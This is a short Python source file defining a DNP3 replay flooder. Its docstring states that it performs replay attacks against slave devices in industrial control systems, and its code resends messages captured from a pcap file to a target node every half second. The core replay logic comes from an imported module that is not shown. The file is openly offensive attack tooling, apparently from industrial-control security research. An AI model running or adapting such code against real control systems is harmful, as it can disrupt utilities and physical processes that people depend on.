__author__ = 'Nicholas Rodofile'
"""
This script is used to perform replay attacks against slave devices.
"""
from DNP3_Replay import *

class DNP3_Replay_Flooder(DNP3_Replay):
    def __init__(self, node, port, pcap):
        DNP3_Replay.__init__(self, node, port, pcap)

    def replay(self):
        print len(self.replay_messages), "replay_messages"
        for m in self.replay_messages:
            self.queue_out.put(m[DNP3])
            sleep(0.5)

    def start(self):
        super(DNP3_Replay, self).start()



